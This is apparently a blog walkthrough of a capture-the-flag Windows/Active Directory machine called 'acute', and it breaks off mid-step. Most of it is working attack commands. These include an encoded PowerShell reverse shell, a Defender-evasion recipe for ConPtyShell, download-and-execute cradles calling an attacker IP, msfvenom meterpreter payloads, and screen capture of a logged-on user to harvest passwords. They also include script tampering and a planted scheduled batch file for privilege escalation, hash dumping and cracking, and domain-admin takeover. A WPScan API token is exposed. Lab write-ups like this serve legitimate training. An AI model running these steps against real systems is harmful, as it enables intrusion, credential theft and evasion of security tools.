---
layout: post
title: "acute"
date: 2025-08-27 
categories: ctf
---
# acute

## Summary:

- Found credentials in exposed files
- Access to PSWA
- winpeas
- found logged on users
- found dir that’s AV excluded dir
- custom ConPTY rev Shell to bypass AV
- meterpreter shell, migrate stable process to session that’s already logged on, screenshare and screenshot to find exposed credentials
- limited shell
- inject malicious command to ps script to gain local administrator privilege
- hashdump from meterpreter, or regsave to impacket-secretsdump to reveal Administrator password
- Password reuse found in domain user
- Found routine batch script that’s executed every 5 mins, inject malicious command to get option 1: rev shell, option 2: add user to privileged group
- option 1: rev shell, bloodhound, add user to site_admin, add user to domain admin
- option 2: review old docx file for site_admin clue, add user to site_admin, add user to domain_admin

## Attack Path:

First let’s scan the open ports:

```bash
sudo nmap -sC -sV 10.10.11.145

PORT    STATE SERVICE  VERSION
443/tcp open  ssl/http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_ssl-date: 2025-08-11T07:52:10+00:00; -24m20s from scanner time.
|_http-title: Not Found
| ssl-cert: Subject: commonName=atsserver.acute.local
| Subject Alternative Name: DNS:atsserver.acute.local, DNS:atsserver
| Not valid before: 2022-01-06T06:34:58
|_Not valid after:  2030-01-04T06:34:58
| tls-alpn: 
|_  http/1.1
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

```

There is a https site. Let’s check it out.

```bash
10.10.11.145 atsserver.acute.local acute.local
```

We also get the DNS name. Let’s add that to our /etc/hosts file. We attempt using the IP address as the URL but we get back a 404 not found. Let’s attempt to visit atsserver.acute.local.

![image.png]({{ site.baseurl }}/assets/acute/image.png)

We also find out this is a wordpress application:

![image.png]({{ site.baseurl }}/assets/acute/image%201.png)

Let’s enumerate wordpress:

```bash
sudo wpscan --url https://atsserver.acute.local --enumerate --api-token 2xkAZXNy4fEMFKyADzmPF2VTMDYb9qV3aUtDrDK5Zzs --disable-tls-checks

Scan Aborted: Unable to identify the wp-content dir, please supply it with --wp-content-dir, use the --scope option or make sure the --url value given is the correct one

```

Did not work.

Let’s also scan for sub directories:

```bash
gobuster dir -u https://atsserver.acute.local -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt

ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -u https://atsserver.acute.local/FUZZ -ic

aspnet_client           [Status: 301, Size: 167, Words: 9, Lines: 2, Duration: 1001ms]
```

Attempting to visit the site found is forbidden:

![image.png]({{ site.baseurl }}/assets/acute/image%202.png)

Playing around with the site, we also found new hyperlinks to click by clicking on about us:

![image.png]({{ site.baseurl }}/assets/acute/image%203.png)

Clicking on the New Start Form, it downloaded a docx file. 

Important information found in file New_Starter_Checklist_v7.docx:

![image.png]({{ site.baseurl }}/assets/acute/image%204.png)

![image.png]({{ site.baseurl }}/assets/acute/image%205.png)

![image.png]({{ site.baseurl }}/assets/acute/image%206.png)

![image.png]({{ site.baseurl }}/assets/acute/image%207.png)

Default password is:

```bash
Password1!
```

Let’s visit the Staff dir and the Induction:

![image.png]({{ site.baseurl }}/assets/acute/image%208.png)

Not found… Hovering over the hyperlink revealed that the dir name is actually in lowercase.

Visiting acute_staff_access prompts us a required login page for Windows PowerShell access:

```bash
https://atsserver.acute.local/acute_staff_access
```

![image.png]({{ site.baseurl }}/assets/acute/image%209.png)

We have a potential password so far but no usernames or Computer name. Let’s check the metadata of the docx file 

```bash
exiftool New_Starter_CheckList_v7.docx

ExifTool Version Number         : 13.25
File Name                       : New_Starter_CheckList_v7.docx
Directory                       : .
File Size                       : 35 kB
File Modification Date/Time     : 2025:08:11 09:38:56+01:00
File Access Date/Time           : 2025:08:11 09:46:42+01:00
File Inode Change Date/Time     : 2025:08:11 09:39:24+01:00
File Permissions                : -rw-rw-r--
File Type                       : DOCX
File Type Extension             : docx
MIME Type                       : application/vnd.openxmlformats-officedocument.wordprocessingml.document
Zip Required Version            : 20
Zip Bit Flag                    : 0x0006
Zip Compression                 : Deflated
Zip Modify Date                 : 1980:01:01 00:00:00
Zip CRC                         : 0x079b7eb2
Zip Compressed Size             : 428
Zip Uncompressed Size           : 2527
Zip File Name                   : [Content_Types].xml
Creator                         : FCastle
Description                     : Created on Acute-PC01
Last Modified By                : Daniel
Revision Number                 : 8
Last Printed                    : 2021:01:04 15:54:00Z
Create Date                     : 2021:12:08 14:21:00Z
Modify Date                     : 2021:12:22 00:39:00Z
Template                        : Normal.dotm
Total Edit Time                 : 2.6 hours
Pages                           : 3
Words                           : 886
Characters                      : 5055
Application                     : Microsoft Office Word
Doc Security                    : None
Lines                           : 42
Paragraphs                      : 11
Scale Crop                      : No
Heading Pairs                   : Title, 1
Titles Of Parts                 : 
Company                         : University of Marvel
Links Up To Date                : No
Characters With Spaces          : 5930
Shared Doc                      : No
Hyperlinks Changed              : No
App Version                     : 16.0000
```

In the description, it looks like we have the Computer Name: Acute-PC01. Also, we see last modified by Daniel, which could be the username.  We also see Creator FCastle.

Let’s try this out:

```bash
username: daniel
password: Password1!
Computer Name: Acute-PC01
Authentication Type: Default
Use SSL: Yes
```

We also tried, without SSL, did not work. 

Let’s also try FCastle:

```bash
username: fcastle
password: Password1!
Computer Name: Acute-PC01
Authentication Type: Default

```

Did not work. 

Going back to the site, we find this:

![image.png]({{ site.baseurl }}/assets/acute/image%2010.png)

Since the creator of the word document is using first letter of first name and the last name, we can guess this as the potential syntax for usernames. Let’s note down all the names here:

```bash
awallace
chall
edavies
imonks
jmorgan
lhopkins
```

Now let’s attempt to use each of these to log on with default password.

This worked:

```bash
username: edavies
password: Password1!
Computer Name: Acute-PC01
```

We now have PS access:

![image.png]({{ site.baseurl }}/assets/acute/image%2011.png)

Let’s attempt to get a reverse shell so it’s easier to traverse:

```bash
cp /usr/share/nishang/Shells/Invoke-PowerShellTcpOneLine.ps1 shell.ps1
```

Now change the IP and port. Then let’s get base64 encoded version:

```bash
cat shell.ps1 | iconv -t utf-16le | base64 -w 0

JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACcAMQAwAC4AMQAwAC4AMQA2AC4AOAAnACwANAA0ADQANAApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAnAFAAUwAgACcAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAnAD4AIAAnADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAAoACgA=
```

Now let’s start a listener:

```bash
nc -lnvp 4444
```

Now let’s execute:

```bash
powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACcAMQAwAC4AMQAwAC4AMQA2AC4AOAAnACwANAA0ADQANAApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAnAFAAUwAgACcAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAnAD4AIAAnADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAAoACgA=
```

```bash
powershell.exe -EncodedCommand JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACcAMQAwAC4AMQAwAC4AMQA2AC4AOAAnACwANAA0ADQANAApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAnAFAAUwAgACcAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAnAD4AIAAnADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAAoACgA=
```

We get this error:

![image.png]({{ site.baseurl }}/assets/acute/image%2012.png)

Seems like we are blocked by antivirus. 

Let’s look at what users are available on the PC:

```bash
dir C:\Users

Mode                 LastWriteTime         Length Name                                                                 

----                 -------------         ------ ----                                                                 

d-----        12/21/2021   1:01 PM                administrator.ACUTE                                                  

d-----        12/22/2021   1:26 AM                edavies                                                              

d-----        12/21/2021  10:50 PM                jmorgan                                                              

d-----        11/19/2021   9:29 AM                Natasha                                                              

d-r---        11/18/2020  11:43 PM                Public                                                               
```

We checked C:\Users\Public but got denied, no files in edavie’s Documents or Desktop folder. No privileges. 

Let’s get the network information as well:

```bash
Ethernet adapter Ethernet 2:

 

   Connection-specific DNS Suffix  . : 

   Link-local IPv6 Address . . . . . : fe80::9513:4361:23ec:64fd%14

   IPv4 Address. . . . . . . . . . . : 172.16.22.2

   Subnet Mask . . . . . . . . . . . : 255.255.255.0

   Default Gateway . . . . . . . . . : 172.16.22.1
```

We can try and find hidden files as well. Looking at C:\dir we find Utils dir. However, looking inside there are no files. Let’s use this command to reveal hidden files:

```bash
gci C:\Utils -Force

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a-h--        21/12/2021     18:41            148 desktop.ini

type C:\Utils\desktop.ini

[.ShellClassInfo]
InfoTip=Directory for Testing Files without Defender
```

Looks like we can execute files inside here without Defender blocking us.

Let’s try and get winpeas to the machine. However, the output of winpeas executed on the PSWA is very ugly, let’s try to get a ConPtyShell. We already know from before from our last reverse shell attempt, Defender is catching malicious commands. Let’s try and evade the defender. First download ConPtyShell from github and rename it to rev.ps1; another way to get reverse shell is to create a meterpreter shell payload with msfvenom and start a listener from msfconsole. 

### Evade Defender

https://github.com/antonioCoco/ConPtyShell/blob/master/Invoke-ConPtyShell.ps1

- First download the ps script and change its name to e.g. rev.ps1
- Now delete all its descriptions from <# to #>
- change the function name Invoke-ConPtyShell to e.g. billy, and now edit and replace all instances of ConPtyShell to e.g. billy as well.
- on attack host:

```bash
stty raw -echo; (stty size; cat) | nc -lvnp 3001
python3 -m http.server 8001
```

- Now on target host, download and import module in memory, assuming our python server is still up

```bash
IEX(New-Object Net.WebClient).downloadString("http://10.10.16.12:8001/rev.ps1")
billy 10.10.16.12 3001
```

We now have shell

![image.png]({{ site.baseurl }}/assets/acute/image%2013.png)

Now let’s download and run winpeas:

[https://github.com/peass-ng/PEASS-ng/releases](https://github.com/peass-ng/PEASS-ng/releases)

```bash
wget http://10.10.16.8:8001/winpeas.exe -o winpeas.exe
.\winpeas.exe
```

Interesting things we found:

```bash
╔══════════╣ RDP Sessions
    SessID    pSessionName   pUserName      pDomainName              State     SourceIP
    1         Console        edavies        ACUTE                    Active

╔══════════╣ Looking for possible password files in users homes
╚  https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#files-and-registry-credentials
    C:\Users\All Users\Microsoft\UEV\InboxTemplates\RoamingCredentialSettings.xml
    C:\Users\edavies\AppData\Local\Microsoft\Edge\User Data\ZxcvbnData\2.0.0.0\passwords.txt
```

The password files did not lead to anything interesting. However, we see that user edavies also have an active session. We could’ve also found this information from:

```bash
query user

 USERNAME              SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME
 edavies               console             1  Active      none   11/08/2025 08:49

```

Let’s get a meterpreter shell as it’s easier to migrate processes so we can use screenshare command to see what that user is doing. 

## generate meterpreter shell payload

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.16.12 LPORT=9001 -f exe > rev.exe

#for pwnbox
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.6 LPORT=9001 -f exe > rev.exe

#try reverse_https
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.16.12 LPORT=9002 -f exe -o rev_https.exe
```

## Start listener

```bash
msfconsole
use exploit/multi/handler
set lhost tun0
set lport 9001
set payload windows/x64/meterpreter/reverse_tcp
run

#reverse_https, not stable 
use exploit/multi/handler
set lhost tun0
set lport 9002
set payload windows/x64/meterpreter/reverse_https
run
```

Now we can transfer the payload onto the target:

```bash
#on attack host
python3 -m http.server 8001

#on target C:\Utils dir
wget -o rev.exe http://10.10.16.12:8001/rev.exe

#from pwnbox
wget -o rev2.exe http://10.10.14.6:8001/rev.exe

#reverse https
wget -o rev_https.exe http://10.10.16.12:8001/rev_https.exe

```

Now let’s execute the payload to get back a meterpreter shell:

```bash
.\rev.exe

#from pwnbox
.\rev2.exe
```

Now we need to migrate our process to a stable process that is running under session 1

Now let’s look at the process list:

```bash
ps 

#we need stable processes, we can use either one of these
 3564  3536  explorer.exe                x64   1        ACUTE\edavies  C:\Windows\explorer.exe
 3588  804   RuntimeBroker.exe           x64   1        ACUTE\edavies  C:\Windows\System32\RuntimeBroker.exe

```

Let’s migrate process to explorer.exe:

```bash
migrate 3564

[*] Migrating from 780 to 3564...
[*] Migration completed successfully.
```

Now let’s try and capture the user’s screen:

```bash
screenshare

#we can also use "screenshot" to capture images
```

![image.png]({{ site.baseurl }}/assets/acute/image%2014.png)

[Custom Screenshot attempt](https://www.notion.so/Custom-Screenshot-attempt-25c068bbc57d80059450c03be59b6cba?pvs=21)

We get the following credentials:

```bash
Enter-PSSession -computername atsserver
$pass = ConvertTo-SecureString "W3_4R3_th3_f0rce." -AsPlaintext -Force
$cred = New-Object System.Management.Automation.PSCredential ("acute\imonks", $pass)
Enter-PSSession -computername ATSSERVER -credential $cred
Enter-PSSession -computername ATSSERVER -ConfigurationName dc_manage -credential $cred
```

Since we are already in a PS Session, we cannot enter another. 

```bash
$pass = ConvertTo-SecureString "W3_4R3_th3_f0rce." -AsPlaintext -Force
$cred = New-Object System.Management.Automation.PSCredential ("acute\imonks", $pass)
Invoke-Command atsserver -ConfigurationName dc_manage -Credential $cred -ScriptBlock { whoami }

acute\imonks
```

We can check what commands we are permitted to use:

```bash
Invoke-Command atsserver -ConfigurationName dc_manage -Credential $cred -ScriptBlock { Get-Command }

CommandType     Name                                               Version    Source                                 PSComputerName
-----------     ----                                               -------    ------                                 --------------
Cmdlet          Get-Alias                                          3.1.0.0    Microsoft.PowerShell.Utility           atsserver
Cmdlet          Get-ChildItem                                      3.1.0.0    Microsoft.PowerShell.Management        atsserver
Cmdlet          Get-Command                                        3.0.0.0    Microsoft.PowerShell.Core              atsserver
Cmdlet          Get-Content                                        3.1.0.0    Microsoft.PowerShell.Management        atsserver
Cmdlet          Get-Location                                       3.1.0.0    Microsoft.PowerShell.Management        atsserver
Cmdlet          Set-Content                                        3.1.0.0    Microsoft.PowerShell.Management        atsserver
Cmdlet          Set-Location                                       3.1.0.0    Microsoft.PowerShell.Management        atsserver
Cmdlet          Write-Output                                       3.1.0.0    Microsoft.PowerShell.Utility           atsserver

```

We can see what these commands actually map to:

```bash
Invoke-Command atsserver -ConfigurationName dc_manage -Credential $cred -ScriptBlock { Get-Alias }

CommandType     Name                                               Version    Source                                 PSComputerName
-----------     ----                                               -------    ------                                 --------------
Alias           cat -> Get-Content                                                                                   atsserver
Alias           cd -> Set-Location                                                                                   atsserver
Alias           echo -> Write-Output                                                                                 atsserver
Alias           ls -> Get-ChildItem                                                                                  atsserver
Alias           pwd -> Get-Location                                                                                  atsserver
Alias           sc -> Set-Content                                                                                    atsserver
Alias           type -> Get-Content                                                                                  atsserver
```

We can now get the user flag:

```bash
Invoke-Command atsserver -ConfigurationName dc_manage -Credential $cred -ScriptBlock { pwd }

C:\Users\imonks\Documents atsserver

Invoke-Command atsserver -ConfigurationName dc_manage -Credential $cred -ScriptBlock { cat ../Desktop/user.txt }
```

Let’s see what else is here:

```bash
Invoke-Command atsserver -ConfigurationName dc_manage -Credential $cred -ScriptBlock { ls -force ../Desktop }

#-force reveals hidden files as well

Mode                 LastWriteTime         Length Name                                                 PSComputerName
----                 -------------         ------ ----                                                 --------------
-ar---        27/08/2025     09:19             34 user.txt                                             atsserver
-a----        11/01/2022     18:04            602 wm.ps1                                               atsserver

```

Let’s see the content:

```bash
Invoke-Command atsserver -ConfigurationName dc_manage -Credential $cred -ScriptBlock { cat ../Desktop/wm.ps1 }

$securepasswd = '01000000d08c9ddf0115d1118c7a00c04fc297eb0100000096ed5ae76bd0da4c825bdd9f24083e5c0000000002000000000003660000c00000001000000080f704e251793f
5d4f903c7158c8213d0000000004800000a000000010000000ac2606ccfda6b4e0a9d56a20417d2f67280000009497141b794c6cb963d2460bd96ddcea35b25ff248a53af0924572cd3ee91a28d
ba01e062ef1c026140000000f66f5cec1b264411d8a263a2ca854bc6e453c51'
$passwd = $securepasswd | ConvertTo-SecureString
$creds = New-Object System.Management.Automation.PSCredential ("acute\jmorgan", $passwd)
Invoke-Command -ScriptBlock {Get-Volume} -ComputerName Acute-PC01 -Credential $creds
```

The script is executing Get-Volume as jmorgan, and jmorgan’s password is secure;  an in-memory encrypted representation of the original password. The ConvertTo-SecureString cmdlet takes the encrypted string ($securepasswd) and decrypts it back into a SecureString object, which is an in-memory, encrypted representation of the original password.

Our goal is to replace the Get-Volume command, with a malicious one, either escalating our user to a higher privilege or getting a reverse shell as jmorgan.

We know that jmorgan is a local administrator from executing this on PS:

```bash
net localgroup administrators

ACUTE\Domain Admins
ACUTE\jmorgan
Administrator
```

Let’s raise edavies’ privilege to a local administrator:

```bash
Invoke-Command atsserver -ConfigurationName dc_manage -Credential $cred -ScriptBlock {((Get-Content "c:\users\imonks\Desktop\wm.ps1" -Raw) -replace 'Get-Volume','net localgroup administrators edavies /add') | set-content -path c:\users\imonks\Desktop\wm.ps1}

Invoke-Command -computername ATSSERVER -ConfigurationName dc_manage -ScriptBlock {cat c:\users\imonks\Desktop\wm.ps1} -credential $cred

$securepasswd = '01000000d08c9ddf0115d1118c7a00c04fc297eb0100000096ed5ae76bd0da4c825bdd9f24083e5c0000000002000000000003660000c00000001000000080f704e251793f
5d4f903c7158c8213d0000000004800000a000000010000000ac2606ccfda6b4e0a9d56a20417d2f67280000009497141b794c6cb963d2460bd96ddcea35b25ff248a53af0924572cd3ee91a28d
ba01e062ef1c026140000000f66f5cec1b264411d8a263a2ca854bc6e453c51'
$passwd = $securepasswd | ConvertTo-SecureString
$creds = New-Object System.Management.Automation.PSCredential ("acute\jmorgan", $passwd)
Invoke-Command -ScriptBlock {net localgroup administrators edavies /add} -ComputerName Acute-PC01 -Credential $creds
```

Now let’s execute and check whether it worked:

```bash
Invoke-Command atsserver -ConfigurationName dc_manage -Credential $cred -ScriptBlock { C:\Users\imonks\Desktop\wm.ps1 }

net localgroup administrators

Members

-------------------------------------------------------------------------------
ACUTE\Domain Admins
ACUTE\edavies
ACUTE\jmorgan
Administrator
The command completed successfully.

```

Now we have to sign out edavies web PS, and sign back in for the change to take in effect.

Now redoing the steps to get our conpty shell, we can check our new privileges:

```bash
whoami /priv
```

![image.png]({{ site.baseurl }}/assets/acute/image%2015.png)

We are now administrator.

Now we can either get SYSTEM and SAM with regsave, or we can also get a meterpreter shell and use hashdump. Let’s do the latter:

```bash
#after getting meterpreter shell
getsystem
hashdump

Administrator:500:aad3b435b51404eeaad3b435b51404ee:a29f7623fd11550def0192de9246f46b:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Natasha:1001:aad3b435b51404eeaad3b435b51404ee:29ab86c5c4d2aab957763e5c1720486d:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:24571eab88ac0e2dcef127b8e9ad4740:::
```

Now we can attempt to crack the hash:

```bash
a29f7623fd11550def0192de9246f46b
29ab86c5c4d2aab957763e5c1720486d
```

```bash
hashcat.exe -m 1000 wordlists/admin_hash.txt wordlists/rockyou.txt

a29f7623fd11550def0192de9246f46b:Password@123
```

Let’s see if there is any password reuse at atsserver. First we need a list of users:

```bash

Invoke-Command atsserver -ConfigurationName dc_manage -Credential $cred -ScriptBlock { net user }

Administrator            awallace                 chall                        
edavies                  Guest                    imonks                       
jmorgan                  krbtgt                   lhopkins
```

Excluding Guest, edavies, jmoran, imonks, krbtgt let’s try out the password found on the rest of the users:

```bash
$pass = ConvertTo-SecureString "Password@123" -AsPlaintext -Force
$cred = New-Object System.Management.Automation.PSCredential ("acute\awallace", $pass)
Invoke-Command atsserver -ConfigurationName dc_manage -Credential $cred -ScriptBlock { whoami }

acute\awallace
```

We have awallace’s login. Enumerating through files, we find a folder Keepmeon in C:\Program Files:

```bash
Invoke-Command atsserver -ConfigurationName dc_manage -Credential $cred -ScriptBlock { ls 'C:\Program Files\Keepmeon' }

-a----        21/12/2021     14:57            128 keepmeon.bat                                         atsserver
```

```bash
Invoke-Command atsserver -ConfigurationName dc_manage -Credential $cred -ScriptBlock { cat 'C:\Program Files\Keepmeon\keepmeon.bat'}

REM This is run every 5 minutes. For Lois use ONLY
@echo off
 for /R %%x in (*.bat) do (
 if not "%%x" == "%~0" call "%%x"
)
```

What the script does is:

```bash
Every time this script runs (apparently every 5 minutes), it will:

Search the entire folder tree for every .bat file.

Run them all, except itself.
```

We just have to place a malicious file in Keepmeon. Option 1: We can either get a reverse shell back or Option 2: raise the privilege of a user we have in control of on ATSServer e.g. awallace

## Option 1

Let’s create a malicious file:

```bash
Invoke-Command atsserver -ConfigurationName dc_manage -Credential $cred -ScriptBlock { Set-Content -Path 'C:\Program Files\keepmeon\rev.bat' -value 'powershell "IEX(New-Object Net.WebClient).downloadString(\"http://10.10.16.12:8001/rev2.ps1\")"'}

#rev2.ps1 is the same as rev.ps1, except the following line is added at the end:
billy 10.10.16.12 4001
```

Listener:

```bash
stty raw -echo; (stty size; cat) | nc -lvnp 4001
```

We now have shell on ATSServer. 

![image.png]({{ site.baseurl }}/assets/acute/image%2016.png)

Now we can use SharpHound to map out the AD structure and see if lhopkins have excessive privilege.

```bash
wget -o sh.exe http://10.10.16.12:8001/SharpHound.exe
.\sh.exe -c all
```

Now let’s transfer the file over and open it on our attack host.

```bash
sudo impacket-smbserver share -smb2support . -user test -password test

#back on ATSServer
net use \\10.10.16.12\share /user:test test

#Does not work.
#We could base64 encode the whole zip file...
[Convert]::ToBase64String([System.IO.File]::ReadAllBytes("20250827161101_BloodHound.zip"))

#now copy the encoded string to a file and decode it:
cat bh_encoded.txt | base64 -d > bh_out.zip
```

```bash
sudo neo4j start
bloodhound
```

Looking at user lhopkins, we realise we have genericAll over site_admin, which is a member of Domain Admins. At this point we can add any user to Domain Admin. 

![image.png]({{ site.baseurl }}/assets/acute/image%2017.png)

Now we can add any user site_admin, then domain admins:

```bash
net group site_admin awallace /add /domain

net group site_admin /domain

awallace 
```

Now switch back to awallace’s tab and add ourself to Domain Admin.

```bash
Invoke-Command atsserver -ConfigurationName dc_manage -Credential $cred -ScriptBlock { net group "Domain Admins" /domain }
```

Now we can read root.txt:

```bash
Invoke-Command atsserver -ConfigurationName dc_manage -Credential $cred -ScriptBlock { cat 'C:\Users\Administrator\Desktop\root.txt' }
```

## Option 2:

Think back to the docx file:

![image.png]({{ site.baseurl }}/assets/acute/image%2018.png)

We can find out more information about site_admin:

```bash
Invoke-Command atsserver -ConfigurationName dc_manage -Credential $cred -ScriptBlock { net group site_admin /domain }

Group name     Site_Admin
Comment        Only in the event of emergencies is this to be populated. This has access to Domain Admin group

Members
```

This has access to the Domain Admin group.

Let’s attempt to add awallace to site_admin first:

```bash
Set-Content -Path 'c:\program files\Keepmeon\add.bat' -Value 'net group site_admin
awallace /add /domain'

Invoke-Command atsserver -ConfigurationName dc_manage -Credential $cred -ScriptBlock { Set-Content -Path 'c:\program files\Keepmeon\add.bat' -Value 'net group site_admin awallace /add /domain' }

Invoke-Command atsserver -ConfigurationName dc_manage -Credential $cred -ScriptBlock { Set-Content -Path 'c:\program files\Keepmeon\add2.bat' -Value 'net group site_admin imonks /add /domain' }

Invoke-Command atsserver -ConfigurationName dc_manage -Credential $cred -ScriptBlock { cat 'c:\program files\Keepmeon\add.bat' }
```

After 5 minutes, let’s check whether we are part of site_admin group:

```bash
Invoke-Command atsserver -ConfigurationName dc_manage -Credential $cred -ScriptBlock { net group site_admin /domain }

```

Now let’s add ourself to domain admins group:

```bash
